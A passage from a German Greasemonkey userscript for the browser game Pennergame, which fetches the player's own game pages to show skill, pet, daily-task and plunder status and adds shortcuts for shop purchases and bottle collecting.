                    if (cart == null)
                        return;
                    cart.style.cursor = 'pointer';

                    cart.addEventListener('click', function(event) {
                        // Wartecursor anzeigen
                        CursorWait(this, true);
                        PGu_setValue("collect", 1);
                        if (event.shiftKey != 0) {
                            CollEndAlert = 1 - CollEndAlert;
                            PG_setValue("CollEndAlert", CollEndAlert);
                        }
                        window.setTimeout("window.location.href = window.location.protocol + '//' + window.location.host + '/activities/'", 500);
                    },false);
                }
            }

            if (Right$(location.toString(), 11) == "activities/" || Right$(location.toString(), 18) == "activities/bottle/")
                if (PGu_getValue("collect", 0) == 1) {
                    var evt = document.createEvent("HTMLEvents");
                    evt.initEvent("change", true, true);

                    var timeOptions = document.getElementsByName("time")[0];
                    timeOptions.selectedIndex = PGu_getValue("lastCollectTime", 0);
                    timeOptions.dispatchEvent(evt);
                    timeOptions.addEventListener( "change",
                          function(){  PGu_setValue("lastCollectTime", document.getElementsByName("time")[0].selectedIndex);
                               timeOptionsCaptcha.selectedIndex = timeOptions.selectedIndex; },
                          true );

                    var timeOptionsCaptcha = timeOptions.cloneNode(true);
                    timeOptionsCaptcha.selectedIndex = timeOptions.selectedIndex;
                    timeOptionsCaptcha.addEventListener( "change",
                         function(){ PGu_setValue("lastCollectTime", document.getElementsByName("time")[0].selectedIndex);
                             timeOptions.selectedIndex = timeOptionsCaptcha.selectedIndex;},
                         true);

                    var captchaHolder = document.getElementById("holder");
                    var infoText = captchaHolder.insertBefore(document.createElement('p'),captchaHolder.getElementsByTagName("span")[1]);
                    infoText.innerHTML = "Zeit:";
                    infoText.appendChild(timeOptionsCaptcha);
                    infoText.style.margin = "0px";
                    infoText.style.marginTop = "8px";
                    captchaHolder.getElementsByTagName("span")[1].style.marginTop = "-8px";
                    captchaHolder.getElementsByTagName("span")[1].style.marginLeft = "-10px";

                    var cancelButton = captchaHolder.getElementsByClassName("cancel")[0];
                    cancelButton.style.margin = "0px";
                    cancelButton.style.marginLeft = "10px";
                    infoText.appendChild(cancelButton);

                    setTimeout("document.getElementsByName('Submit2')[0].click();", 1000); // fails often if to fast
                }
            }
    });

    // **********************************************************************************
    // *** GM_XMLHTTPREQUEST *** Abfragen der aktuellen Skill-Level
    // **********************************************************************************
    GM_xmlhttpRequest({method:"GET", url: WB_URL, onload:function(responseDetails) {
            var content = responseDetails.responseText;

            // Aus HTML ein DOM-Objekt erzeugen
            var doc = HTML2DOM(content);

            var sk = true;
            var skAnz = 3;
            var skAtt = -1;
            var tables = doc.getElementsByClassName("skill_block");
            if (tables.length == 0) {
               var tables = doc.getElementsByTagName("table");
               sk = false;
            }
            if (content.indexOf('"/pet/"') != -1) {
               var t = document.getElementById("topmenu").getElementsByClassName("pet")[0];
               t = getComputedStyle(t, null);
               if (parseInt(t.width) > 0 && !sk)
                  skAnz = 4;
            }
            if (sk && skAnz == 3) {
                document.getElementById("ADBACKimg").src = getIconAddr(ICON_ATTDEFJOBBACK[nrOfTabs == 6?0:1]);
                document.getElementById("ADBACKimg").src = getIconAddr(ICON_ATTDEFJOBBACK[nrOfTabs == 6?0:1]);
                if (document.getElementById("defweaponlnk"))
                    document.getElementById("defweaponlnk").href = MINIJOBS_URL;
		else
                    ShowImg('ADBACK', MINIJOBS_URL, ICON_NODEFWEAPON, '', '', '', 84, 13, 1, 'defweapon');
            }
            for (var i = 0; i < tables.length; i++) {
                var table = tables[i];

                if (sk) {
                    if (table.getElementsByClassName("slot_3").length > 0) {
                        var skill = table.getElementsByTagName("h2")[0].innerHTML;
                        var skillLvl = table.getElementsByClassName("skill_progress_text")[0].innerHTML.split(" ")[0];
                    }
                    else
                        continue;
                }
                else {
                    // Referenz auf Tabellenzeilen in trs speichern
                    var trs = table.getElementsByTagName("tr");
                    if (trs[0].innerHTML.indexOf(TxtEstimated[lang]) != -1 || trs[0].innerHTML.indexOf('processbar_bg') == -1)
                        continue;
                    var skill = trs[0].innerHTML.split('<strong>')[1].split('</strong>')[0];
                    var skillLvl = trs[0].innerHTML.split('="108">')[1].split('<span')[0];
                }
                switch (skill) {
                    case TxtSkillATT[lang]:
                                    glblVars[0] = Number(skillLvl);
                                    var skAtt = i;
                                    break;
                    case TxtSkillDEF[lang]:
                                    glblVars[1] = Number(skillLvl);
                                    break;
                    case TxtSkillDEX[lang]:
                                    glblVars[2] = Number(skillLvl);
                                    break;
                    default: break;
                }
            }
            if (skAtt >= 0)
                var actSkills = skAtt;
            else 
                var actSkills = doc.getElementsByClassName('box_main_small').length;
            if (actSkills == 0) {
                ShowImg ('SCBACK', WB_URL, ICON_PLUNDERB, getLangTxt(TxtNoSkill), '', '', 6, (skAnz==4)?18:21, 4, 'skill1');
                ShowImg ('SCBACK', WB_URL, ICON_PLUNDERB, getLangTxt(TxtNoSkill), '', '', 6, (skAnz==4)?26:31, 4, 'skill2');
            } else {
                var start_time = content.split('var start = ')[1].split(';')[0];
                var end_time = Number(content.split('var end = ')[1].split(';')[0]);
                var jetzt = content.split('<input id="now_timestamp" type="hidden" value="')[1].split('">')[0];
                var skilllvl = content.split('box_text_small">')[1];
                var skill = skilllvl.split('">')[1].split('<')[0];
                var level = skilllvl.split('[')[1].split(']')[0].split(' ')[1];
                var percent = jetzt>=end_time?100:Math.round((jetzt - start_time) / (end_time - start_time) * 1000) / 10;
                var text = skill + ' ' + level + ', ' + percent + '%, ' + FmtInfo(jetzt, end_time);
                var width = Math.ceil(25/100*percent);
                ShowImg ('SCBACK', WB_URL, ICON_PLUNDERA, text, '', '', 6, (skAnz==4)?18:21, 3, 'skill1bg');
                if (width > 0)
                    ShowImg ('SCBACK', WB_URL, ICON_CLEAN, text, width, 5, 6, (skAnz==4)?18:21, 4, 'skill1fg');
                if (actSkills > 1) {
                    skilllvl = content.split('box_text_small">')[2];
                    var skill2 = skilllvl.split('">')[1].split('<')[0];
                    var level2 = skilllvl.split('[')[1].split(']')[0].split(' ')[1];
                    var endtime= skilllvl.split('style_skill">')[2].split('<')[0];
                    if (isNaN(endtime.substr(0,2))) {
                        var now = new Date;
                        endtime = endtime.split(', ')[1];
                        endtime = new Date(now.getFullYear(), now.getMonth(), now.getDate(), endtime.substr(0,2), endtime.substr(3,2), 0);
                        if (endtime < now)
                            endtime.setTime(endtime.getTime() + 86400*1000);
                    }
                    else
                    	endtime = new Date(2000+Number(endtime.substr(6,2)), Number(endtime.substr(3,2)-1), endtime.substr(0,2), endtime.substr(10,2), endtime.substr(13,2), 0);
                    endtime = FmtInfo(0, endtime.getTime()/1000 - timeDiff);
                    var text2 = skill2 + ' ' + level2 + endtime.substring(0, endtime.length-3);
                    ShowImg ('SCBACK', WB_URL, ICON_PLUNDERA, text2, '', '', 6, (skAnz==4)?26:31, 3, 'skill2bg');
                } else {
                    ShowImg ('SCBACK', WB_URL, ICON_PLUNDERB, getLangTxt(TxtNoSkill), '', '', 6, (skAnz==4)?26:31, 4, 'skill2');
                }
                var skillTim = function() {
                    jetzt = Number(jetzt) + 1;
                    if (!document.getElementById('skill1fg'))
                        return;
                    window.setTimeout(skillTim, 1000);
                    var percent = jetzt>=end_time?100:Math.round((jetzt - start_time) / (end_time - start_time) * 1000) / 10;
                    var text = skill + ' ' + level + ', ' + percent + '%, ' + FmtInfo(jetzt, end_time);
                    var nwidth = Math.ceil(25/100*percent);
                    if (nwidth > 0)
                        if (width == 0)
                            ShowImg ('SCBACK', WB_URL, ICON_CLEAN, text, nwidth, 5, 6, (skAnz==4)?18:21, 4, 'skill1fg');
                        else {
                            document.getElementById('skill1fg').width = nwidth;
                            document.getElementById('skill1fg').title = text;
                        }
                    document.getElementById('skill1bg').title = text;
                    if (end_time - jetzt < 3600 && actSkills == 1)
                        if (jetzt-Math.floor(jetzt/2)*2 != 0)
                            document.getElementById('skill1fg').src = getIconAddr(ICON_PLUNDERB);
                        else
                            document.getElementById('skill1fg').src = getIconAddr(ICON_CLEAN);
                }
                window.setTimeout(skillTim, 1000);
            }
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abfragen der Haustier-Weiterbildung
            // **********************************************************************************
	    if (!sk) {
                GM_xmlhttpRequest({method:"GET", url: WBPET_URL, onload:function(responseDetails) {
                        var content = responseDetails.responseText;

                        // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                        if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                            // Aus HTML ein DOM-Objekt erzeugen
                            var doc = HTML2DOM(content);

                            var actSkills = doc.getElementsByClassName('box_main_small').length;
                            if (actSkills == 0) {
                                ShowImg ('SCBACK', WBPET_URL, ICON_PLUNDERB, getLangTxt(TxtNoSkill), '', '', 6, (skAnz==4)?34:41, 4, 'skillpet');
                            } else {
                                var start_time = content.split('var start = ')[1].split(';')[0];
                                var end_time = Number(content.split('var end = ')[1].split(';')[0]);
                                var jetzt = content.split('<input id="now_timestamp" type="hidden" value="')[1].split('">')[0];
                                var skilllvl = content.split('box_text_small">')[1];
                                var skill = skilllvl.split('">')[1].split('<')[0];
                                var level = skilllvl.split('[')[1].split(']')[0].split(' ')[1];
                                var percent = jetzt>=end_time?100:Math.round((jetzt - start_time) / (end_time - start_time) * 1000) / 10;
                                var text = skill + ' ' + level + ', ' + percent + '%, ' + FmtInfo(jetzt, end_time);
                                var width = Math.ceil(25/100*percent);
                                ShowImg ('SCBACK', WBPET_URL, ICON_PLUNDERA, text, '', '', 6, (skAnz==4)?34:41, 3, 'skillpetbg');
                                if (width > 0)
                                    ShowImg ('SCBACK', WBPET_URL, ICON_CLEAN, text, width, 5, 6, (skAnz==4)?34:41, 4, 'skillpetfg');
                                var PetSkillTim = function() {
                                    jetzt = Number(jetzt) + 1;
                                    if (!document.getElementById('skillpetfg'))
                                        return;
                                    window.setTimeout(PetSkillTim, 1000);
                                    var percent = jetzt>=end_time?100:Math.round((jetzt - start_time) / (end_time - start_time) * 1000) / 10;
                                    var text = skill + ' ' + level + ', ' + percent + '%, ' + FmtInfo(jetzt, end_time);
                                    var nwidth = Math.ceil(25/100*percent);
                                    if (nwidth > 0)
                                        if (width == 0)
                                            ShowImg ('SCBACK', WB_URL, ICON_CLEAN, text, nwidth, 5, 6, (skAnz==4)?34:41, 4, 'skillpetfg');
                                        else {
                                            document.getElementById('skillpetfg').width = nwidth;
                                            document.getElementById('skillpetfg').title = text;
                                        }
                                    document.getElementById('skillpetbg').title = text;
                                    if (end_time - jetzt < 3600)
                                        if (jetzt-Math.floor(jetzt/2)*2 != 0)
                                            document.getElementById('skillpetfg').src = getIconAddr(ICON_PLUNDERB);
                                        else
                                            document.getElementById('skillpetfg').src = getIconAddr(ICON_CLEAN);
                                }
                            window.setTimeout(PetSkillTim, 1000);
                            }
                        }
                    }
                });
	    }
            // **********************************************************************************
            // *** GM_XMLHTTPREQUEST *** Abfragen Haustier Streunen
            // **********************************************************************************
	    if (sk || skAnz == 4) {
                GM_xmlhttpRequest({method:"GET", url: PET_URL, onload:function(responseDetails) {
                        var content = responseDetails.responseText;

                        // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                        if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                            // Aus HTML ein DOM-Objekt erzeugen
                            var doc = HTML2DOM(content);

			    if (content.indexOf("pet_kader") == -1) {
                                ShowImg ('SCBACK', PET_URL, ICON_PLUNDERA, "Du hast noch kein Tier", '', '', 6, (skAnz==4)?42:41, 4, 'streunpet');
                            } else {
                               var petbusy =  doc.getElementsByClassName('petbusybar');
                               var backflg = 0;
                               for (var b = 0; b < petbusy.length; b++) {
                                   if (petbusy[b].innerHTML.indexOf('Fertig') != -1) {
                                       backflg = 1;
                                       break;
                                   }
                                   if (petbusy[b].innerHTML.indexOf('counter') != -1) {
                                       DispZeit(new Date(), petbusy[b], PET_URL, TxtStreun, "SCBACK", "streunpet", 6, (skAnz==4)?42:41, 3, 10800, 25);
                                       backflg = 2;
                                       break;
                                   }
                               }
                               if (backflg != 2) {
                                   if (backflg == 1)
			              var text = "Dein Haustier ist zurück!";
			           else
		                      var text = "Dein Haustier streunt zur Zeit nicht!";
                                   ShowImg ('SCBACK', PET_URL, ICON_PLUNDERB, text, '', '', 6, (skAnz==4)?42:41, 4, 'streunpet');
                               }
			    }
                        }
                    }
                });
            }

            if (!oldVersion)
                GM_xmlhttpRequest({method: 'GET', url: PLUNDERSHOP_URL,	onload: function(responseDetails) {
                	var content = responseDetails.responseText;
                	// Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                	if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                		var jetzt = new Date();
                		var doc = HTML2DOM(content);
                		var forms = doc.getElementsByTagName("form");
                		for (var j = 0; j < forms.length; j++)
                		    if (forms[j].id == "refresh_plundershop")
                			break;
                		var tdiv = forms[j].parentNode;
                		while (tdiv.getElementsByClassName("trhover").length == 0 && tdiv.getElementsByClassName("refreshbutton2").length == 0)
                		    tdiv = tdiv.parentNode;
                		tdiv = tdiv.getElementsByClassName("trhover");
                		for (var i = 0; i < tdiv.length; i++) {
                			var src = tdiv[i].getElementsByTagName("img")[0].src;
                			var tda = tdiv[i].getElementsByTagName("a");
                			for (var ii = 0; ii < tda.length; ii++) {
                				if (tda[ii].href.indexOf("stock/plunder/") != -1)
                					break;
                            }
                			var plunder = tda[ii].innerHTML.split(">")[1].split("<")[0];
                			var kost = trimString(tda[ii].innerHTML.split("<br>")[1]);
                			var kauf = getLangTxt(TxtBuy);
                			var pnum = tdiv[i].getElementsByTagName("input")[1].value;
                			var curElem = ShowImg ('PSBACK', '', src, kauf+": "+plunder+" ("+kost+")", 24, 24, 1 + i*28, 20, 1, 'buy'+i);
                            if (curElem == null)
                                return;
                			curElem.style.cursor = 'pointer';
                			curElem.name = 'buy'+pnum;
                			// **********************************************************************************
                			// EVENTHANDLER
                			// **********************************************************************************
                			curElem.addEventListener('click', function(event) {
                				// Wartecursor anzeigen
                				CursorWait(event.target, true);
                				var pnum = event.target.name.substr(3);
                				GM_xmlhttpRequest({
                					method: 'POST',
                					url: TOWNBASE_URL+'city/plundershop/buy/',
                					headers: {'Content-type': 'application/x-www-form-urlencoded'},
                					data: encodeURI('plunder='+pnum),
                					onload: function(content) {
                								refreshPage();
                					}
                				});

                			}, false);
                		}
                		if (i == 0)
                			var text = "Plundershop";
                		else
                			var text = getLangTxt(TxtBuyAll);
                		for ( ; i < 3; i++) {
                			var src = getIconAddr(ICON_NOPLUNDEREQUIP);
                			ShowImg ('PSBACK', PLUNDERSHOP_URL, src, '', 24, 24, 1 + i*28, 20, 1, 'pshop'+i);
                		}
                		src = getIconAddr(ICON_PLUNDERRESET);
                		//tdiv = doc.getElementById("refresh_plundershop").getElementsByClassName("refreshbutton")[0];
                		//var text = tdiv.value;
                		var curElem = ShowImg ('PSBACK', '', src, text, 24, 24, 85, 20, 1, 'pshop3');
                        if (curElem == null)
                            return;
                		curElem.style.cursor = 'pointer';
                		// **********************************************************************************
                		// EVENTHANDLER
                		// **********************************************************************************
                		curElem.addEventListener('click', function(event) {
                			// Wartecursor anzeigen
                			CursorWait(event.target, true);
                			var buyCount = 0;
                			for (var i = 0; i < 3; i++)
                				if (document.getElementById('buy'+i)) {
                					var pnum = document.getElementById('buy'+i).name.substr(3);
                					GM_xmlhttpRequest({
                						method: 'POST',
                						url: TOWNBASE_URL+'city/plundershop/buy/',
                						headers: {'Content-type': 'application/x-www-form-urlencoded'},
                						data: encodeURI('plunder='+pnum),
                						onload: function(content) {
                						}
                					});
                					buyCount++;
                				}
                			if (buyCount > 0)
                				window.setTimeout(refreshPage, 1000);
                			else
                				window.location.href = PLUNDERSHOP_URL;
                		}, false);
                		/*currentelem.addEventListener('mouseover', function(event) {
                			var cElem = document.getElementById('pshop3');
                			var sk = (event.shiftKey != 0) || (document.getElementById('buy0') == null);
                			if (sk) {
                				tdiv = doc.getElementById("refresh_plundershop").getElementsByClassName("refreshbutton")[0];
                				cElem.title = tdiv.value;
                			}
                			else
                				cElem.title = "Buy all";
                		}, false);
                		currentelem.addEventListener('mouseout', function(event) {
                			var cElem = document.getElementById('pshop3');
                			var sk = !document.getElementById('buy0');
                			if (sk) {
                				tdiv = doc.getElementById("refresh_plundershop").getElementsByClassName("refreshbutton")[0];
                				cElem.title = tdiv.value;
                			}
                			else
                				cElem.title = "Buy all";
                			cElem.mouseover = null;
                		}, false);*/
                		tdiv = doc.getElementsByClassName("refreshbutton");
                		if (tdiv.length > 1) {
                		    PSwidth = document.getElementById("PSBACKimg").naturalWidth;
                                    DispZeit(jetzt, tdiv[1], PLUNDERSHOP_URL, TxtWaitSort, "PSBACK", "pshop", 0, 47, 1, PSWaitTime, PSwidth);
                		}
                	}
                }
                });
            GM_xmlhttpRequest({
                method: 'GET',
                url: REWARDS_URL,
                onload: function(responseDetails) {
                    var content = responseDetails.responseText;
                    // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                    if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                        var doc = HTML2DOM(content);
                        var table = doc.getElementsByTagName("table");
                        if (table.length > 0) {
                            var trs = table[0].getElementsByTagName("tr");
                            var cards = trs[2].innerHTML.split("<span")[1].split('">')[1].split('</span')[0];
                            var newlink = wrap.appendChild(document.createElement('a'));
                            newlink.innerHTML = '<div id="cards" align="center"><b>' + cards + '</b></div>';
                            newlink.setAttribute('title', getLangTxt(TxtCards) + cards);
                            document.getElementById('cards').setAttribute('style', 'position:absolute; left:' + (SC_X+44) + 'px; top:' + (SC_Y+23) + 'px; z-index:'+(getZ("SCBACK")+5)+'; color:black; width:35px');
                            cacheBgnds("SCBACK", 'cards');
                        }
                    }

                    GM_xmlhttpRequest({method: 'GET', url: OVERVIEW_URL,	onload: function(responseDetails) {
                        var content = responseDetails.responseText;
                        // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                        if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
			    if (sk && skAnz == 3) {
				ShowMiniJob(content);
			    }
                            var today = new Date();
                            var taskDone = (content.indexOf('korkenhaken.png') != -1);
                            if ((content.indexOf('korken.png') == -1) && !taskDone)
                                ShowImg ('SCBACK', '', ICON_WUTINAKTIV, '', '', '', 49, 23, 4, 'taskdone');
                            else {
                                if (taskDone) {
                                    var href = REWARDS_URL;
                                    ShowImg ('SCBACK', href, ICON_GRNBG, '', '', '', 42, 13, 4, 'taskdone');
                                    newlink.setAttribute('href', href);
                                } else {
                                    var href = DAILY_URL;
                                    ShowImg ('SCBACK', href, ICON_REDBG, '', '', '', 42, 13, 4, 'taskdone');
                                    GM_xmlhttpRequest({
                                        method: 'GET',
                                        url: DAILY_URL,
                                        onload: function(responseDetails) {
                                                var content = responseDetails.responseText;
                                                // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                                                if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                                                    href = DAILY_URL;
                                                    var doc = HTML2DOM(content);
                                                    var table = doc.getElementsByTagName("table")[0];
                                                    var trs = table.getElementsByTagName("tr");
                                                    var task = content.split('min-height:40px;">')[1].split('<strong>')[1].split('</strong>')[0];
                                                    for (var t = 0; t < dailyTasks.length; t++)
                                                        if (dailyTasks[t] == task) {
                                                            task = myDailyTasks[t];
                                                            href = TOWNBASE_URL + dailyTaskLinks[t];
                                                            if (t == 12)            // Snack essen
                                                                TAisEatSnack = true;
                                                            else if (t == 13)       // Promille ueber 2% BAC
                                                                TAisDrink2 = true;
                                                            break;
                                                        }
                                                    document.getElementById('taskdonelnk').setAttribute('href', href);
                                                    newlink.setAttribute('href', href);
                                                    var lockDA = PGu_getValue("lockDA", 0);     // Sperrdatum Tagesaufgabe
                                                    if (lockDA != FormatDate(today)) {
                                                        document.getElementById('provocation_area').innerHTML += '<form name="prov_form"><div id="provocation_note"><a class="close" href="#" onclick="CloseProvocation();"><img id="prov_close" src="http://static.pennergame.de/img/pv4/premiummedia/img/premium/provocation/provocation_note_close.png" border="0"></a><div id="provocation_text" class="provocation_text"><div class="prov_links"></div></div></div></form>';
                                                        document.getElementById('provocation_text').innerHTML ='<img src="http://static.pennergame.de/img/pv4/daily_jobs/korken.png"><font style=\"color:yellow; font-size:120%;\"><b>' + getLangTxt(TxtDaily) + '</b></font><br><a href="' + href + '">'+ task +'</a><br><font style=\"color:green; font-size:120%;\"><b>' + getLangTxt(TxtCards) + cards + '</b></font>';
                                                        document.getElementById('provocation_area').setAttribute('style', 'position:absolute; left:' + PA_X + 'px; top:' + PA_Y + 'px; cursor:move');
                                                        //document.getElementById('provocation_area').addEventListener('mousedown', mousedown, false);
                                                        //document.getElementById('provocation_area').addEventListener('mouseup', mouseup, false);
                                                        makeDraggable(document.getElementById('provocation_area'));
                                                        document.getElementById('provocation_area').addEventListener('dblclick', dblclick, false);
                                                        // **********************************************************************************
                                                        // EVENTHANDLER
                                                        // **********************************************************************************
                                                        document.getElementById('prov_close').addEventListener('click', function(event) {
                                                                                var today = new Date();
                                                                                PGu_setValue("lockDA", FormatDate(today));
                                                                                document.getElementById('prov_close').style.visibility = 'hidden';
                                                        },false);
                                                    }
                                                }
                                        }
                                    });
                                }
                            }
                            var doc = HTML2DOM(content);
                            noWash = isNaN(clean);
                            if (noWash || clean < 0) {
                                var cleanTxt = getCleanliness(content);
                                if (cleanTxt != '')
                                    clean = Number(cleanTxt);
                            }
                            if (!isNaN(clean)) {
                                var width = Math.ceil(30/100*clean);
                                if (noWash) {
                                    var proz = "Lebenspunkte: " + clean;
				    if (clean < 80) {
					proz += " (-" + Math.floor((99 - clean)/20) + " DEF)";
					ShowImg ('PWBACK', '', ICON_REDBG, '', 30, 30, 78, 13, 2, 'lifebg');
				    }
                                    var url = MEDICINE_URL;
                                }
                                else {
                                    var proz = clean + "%";
                                    var url = WASHHOUSE_URL;
                                }
                                if (clean != 0)
                                    ShowImg ('PWBACK', url, ICON_CLEAN, proz, width, 5, 78, 46, 4, 'cleanliness');
                                if (clean != 100)
                                    ShowImg ('PWBACK', url, ICON_DIRTY, proz, 30, 5, 78, 46, 3, 'dirtyness');
                            }
                            else {
                       	        var washel = document.getElementById('infozentrale_wash');
                       	        if (washel)
                       	            washel.parentNode.removeChild(washel);
                            }
                            var datadiv = doc.getElementsByClassName("tieritemA");
                            for (var i = 0; i < datadiv.length; i++)
                                if (datadiv[i].innerHTML.toLowerCase().indexOf(TxtBuyPet[lang].toLowerCase()) != -1) {
                                    glblVars[3] = datadiv[i].innerHTML.split('class="att">')[1].split(' ')[0];
                                    glblVars[4] = datadiv[i].innerHTML.split('class="def">')[1].split(' ')[0];
                                } else if (datadiv[i].innerHTML.toLowerCase().indexOf(TxtBuyWeapon[lang].toLowerCase()) != -1) {
                                    glblVars[5] = datadiv[i].innerHTML.split('class="att">')[1].split(/<| /)[0];
                                    if (isNaN(glblVars[5]))
                                        glblVars[5] = 0;
                                    glblVars[6] = datadiv[i].innerHTML.split('class="def">')[1].split('</span')[0];
                                    if (isNaN(glblVars[6]))
                                        glblVars[6] = 0;
                                }

                            // **********************************************************************************
                            // *** GM_XMLHTTPREQUEST *** Abrufen der Plunder-Seite, Prüfen, ob besserer Plunder da
                            // **********************************************************************************
                            GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL, onload:function(responseDetails) {
                                    function checkPlunder(doc, plundertable, plunderbox, aktPlunder) {
                                        var pATTval = Math.floor((glblVars[0] + Number(glblVars[3]) + Number(glblVars[5])) * glblVars[7]);
                                        var pDEFval = Math.floor((glblVars[1] + Number(glblVars[4]) + Number(glblVars[6])) * glblVars[8]);
                                        glblVars[9] = aktPlunder;
                                        var bestFightVal = Number(GetPower(pATTval, pDEFval));
                                        var bestPlunder = "";

                                        // Referenz auf Zeilen der Plundertabelle speichern
                                        if (plundertable)
                                            var plundertrs = plundertable.getElementsByTagName("tr");
                                        else
                                            var plundertrs = new Array();

                                        var AktTrikot = 0;
                                        var TrikotAnz = true;
                                        if (PGu_getValue("TrikotanzeigeAus", 0) == 1)
                                            TrikotAnz = false;
                                        var firsti = oldVersion?0:-1;
                                        for (var i = firsti; i < plundertrs.length; i++) {
                                            if (i == firsti)
                                                if (aktPlunder == "")
                                                    continue;
                                                else
                                                    var plunderHTML = plunderbox.innerHTML;
                                            else
                                                var plunderHTML = plundertrs[i].innerHTML;
                                            if (i == firsti)
                                                var plunder = aktPlunder;
                                            else if (oldVersion)
                                                var plunder = plunderHTML.split('change_stuff')[1].split('">')[1].split('</a>')[0];
                                            else
                                                var plunder = plunderHTML.split('<strong')[1].split('>')[1].split('</strong')[0];
                                            plunder = trimString(plunder);
                                            if (plunder.indexOf(TxtTrikot[lang]) != -1 && TrikotAnz) {
                                                var trikot = plunder.split(' ');
                                                var trikotNr = Number(trikot[trikot.length - 1]);
                                                var plunderpic = plunderHTML.split('src="')[1].split('"')[0];
                                                var Anz = 0;
                                                if (i == firsti)
                                                    AktTrikot = trikotNr;
                                                else
                                                    Anz = Number(GetNumberOfPlunder(doc, plunder));
                                                if (trikotNr == AktTrikot)
                                                    Anz += 1;
                                                if (Anz > 1)
                                                    plunder += " (" + Anz + "x)"
                                                for (var k = 0; k < Anz && k <= 4; k++) {
                                                    var curElem = ShowImg ('PDBACK', '', plunderpic, plunder, '', '', (trikotNr-1)*23 - 3, 55 + k*5, 1, 'trikot'+trikotNr+"_"+k);
                                                    if (curElem == null)
                                                        return;
                                                    TrikotAusHandler(curElem);
                                                }
                                            }
                                            if (plunderHTML.indexOf('change_stuff') == -1)
                                                continue;       // nur anlegbaren Plunder beachten
                                            var addATT = 1;
                                            var addDEF = 1;
                                            if (plunderHTML.indexOf('ATT:') != -1) {
                                                var pATTtxt = trimString(plunderHTML.split('ATT:')[1].split('</li>')[0]);
                                                var pATT = pATTtxt.split(' ')[0];
                                                if (pATTtxt.indexOf('%') != -1)
                                                    addATT = 1 + Number(pATTtxt.split('%')[0].split(' ').pop()) / 100;
                                            } else
                                                var pATT = 0;
                                            if (plunderHTML.indexOf('DEF:') != -1) {
                                                var pDEFtxt = trimString(plunderHTML.split('DEF:')[1].split('</li>')[0]);
                                                var pDEF = pDEFtxt.split(' ')[0];
                                                if (pDEFtxt.indexOf('%') != -1)
                                                    addDEF = 1 + Number(pDEFtxt.split('%')[0].split(' ').pop()) / 100;
                                            } else
                                                var pDEF = 0;
                                            if (plunderHTML.indexOf(TxtIncrease[lang]) != -1)
                                                if (plunderHTML.indexOf('%') != -1) {
                                                    var addText = plunderHTML.split(TxtIncrease[lang])[1].split('%')[0];
                                                    var addTextSplit = addText.split(' ');
                                                    var addPerc = addTextSplit[addTextSplit.length-1];
                                                    if (addText.indexOf('ATT') != -1 || addText.indexOf(TxtIncrATT[lang]) != -1)
                                                        if (addATT == 1)
                                                            addATT = 1 + Number(addPerc) / 100;
                                                    if (addText.indexOf('DEF') != -1 || addText.indexOf(TxtIncrDEF[lang]) != -1)
                                                        if (addDEF == 1)
                                                            addDEF = 1 + Number(addPerc) / 100;
                                                }
                                            pATTval = Math.floor((glblVars[0] + Number(glblVars[3]) + Number(glblVars[5]) + Number(pATT)) * glblVars[7] * addATT);
                                            pDEFval = Math.floor((glblVars[1] + Number(glblVars[4]) + Number(glblVars[6]) + Number(pDEF)) * glblVars[8] * addDEF);
                                            var pPower = Number(GetPower(pATTval, pDEFval));
                                            if (bestFightVal < pPower) {
                                                bestFightVal = pPower;
                                                bestPlunder = plunder;
                                                glblVars[10] = plunder;
                                                }
                                            }
                                        if (bestPlunder != aktPlunder && bestPlunder != "") {
                                            plundercheck = printf (getLangTxt(TxtPlunderCheck), bestPlunder);
                                            logoutWarn = 2;
                                        }
                                        else
                                            plundercheck = "";
                                        if (logoutWarn < 0)
                                            logoutWarn = 0;

                                        // Vergleich der aktuellen Stärke mit der Max-Stärke
                                        var img = document.getElementById('resetfight');
                                        if (img != undefined)
                                            img.setAttribute('title', img.getAttribute('title') + makeAddInfo());
                                        glblVars[11] = m_ownpoints;
                                        glblVars[12] = m_ownuserid;
                                        scriptData[3] = glblVars;
                                    }
                                    // Aktuellen Plunder ermitteln und anzeigen
                                    var content = responseDetails.responseText;
                                    // Wenn die Seite abgerufen werden konnte (kein Seitenladefehler)
                                    if (content.indexOf(KEYWORD_MYBUM[lang]) != -1) {
                                        // Aus dem Responsetext ein Document machen
                                        var doc = HTML2DOM(content);

                                        var plunderbox = doc.getElementsByClassName(oldVersion?"box special":"box")[0];
                                        var aktPlunder = GetCurrentPlundername(plunderbox);

                                        // Referenz auf Plundertabelle speichern
                                        if (oldVersion) {
                                            checkPlunder(content, doc.getElementsByTagName("table")[0], plunderbox, aktPlunder);
                                        } else {
                                            GM_xmlhttpRequest({method:"GET", url: PLUNDER_URL+'ajax/?c=1', onload:function(responseDetails) {
                                                var content = responseDetails.responseText;
                                                // Aus dem Responsetext ein Document machen
                                                var doc = HTML2DOM(content);
                                                checkPlunder(content, doc.getElementsByTagName("table")[0], plunderbox, aktPlunder);
                                            }});
                                        }
                                    }
                                }
                            });
                        }
                        else
                            noUpdate = true;
                    }});
                }
            });
        }
    });
}

// **********************************************************************************
// **********************************************************************************
// Funktion aktualisiert einen Balken bei mouseover bzw. nach vergangener Zeit
// **********************************************************************************
// **********************************************************************************
var balkData = new Array();
function balkDisp(id, end_time, text, counter, jetzt, maxTime, maxWidth, textsub) {
    function mod (a, b) { return a - Math.floor(a/b)*b; }
    var i = balkData.length;
    var idx = id.substr(6);
    id = id.substr(0, 4);
    balkData[i] = new Array(idx, end_time, text, counter, jetzt, maxTime, maxWidth, id);

    function actTime (e) {
        var target = e.target.id;
        var idx = target.substr(6);
        for (i = 0; i < balkData.length; i++) {
            if (balkData[i][0] == idx) {
                var now = new Date();
                now = Math.floor(now.getTime()/1000);
                var zeitText = "";
                zeitText = FmtInfo(now, balkData[i][1]);
                if (lang == 0 && balkData[i][1] - now >= 86400) {
